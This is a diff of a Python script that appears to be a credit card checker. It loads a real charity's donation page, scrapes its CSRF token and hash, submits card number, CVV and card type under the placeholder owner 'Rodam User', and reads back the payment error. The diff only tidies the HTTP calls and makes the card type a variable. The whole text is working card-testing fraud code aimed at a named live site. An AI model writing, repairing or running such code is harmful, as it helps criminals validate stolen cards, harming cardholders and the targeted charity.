@@ -49,7 +49,7 @@ def Tele(ccx):
 	    'ref': 'Donate to Anachnu',
 	}
 	
-	response = session.get('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers)
+	response = requests.get('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers)
 	
 	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
 	tok = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
@@ -93,7 +93,7 @@ def Tele(ccx):
 	    'formField_DonateMonthly': '',
 	    'formField_Comment': '',
 	    'formPayment_method': 'Credit Card',
-	    'formPayment_card': 'Visa',
+	    'formPayment_card': f'{card_type}',
 	    'formPayment_owner': 'Rodam User',
 	    'formPayment_number': f'{n}',
 	    'formPayment_cvv': f'{cvc}',
@@ -120,7 +120,7 @@ def Tele(ccx):
 	    'fs_id': 'Donate%20to%20Anachnu',
 	}
 	
-	response = session.post('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
+	response = requests.post('https://www.ujajcc.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
 	
 	result = re.search(r'<b>Payment error:<\/b> (.*?)<\/div>', response.text).group(1)
 		
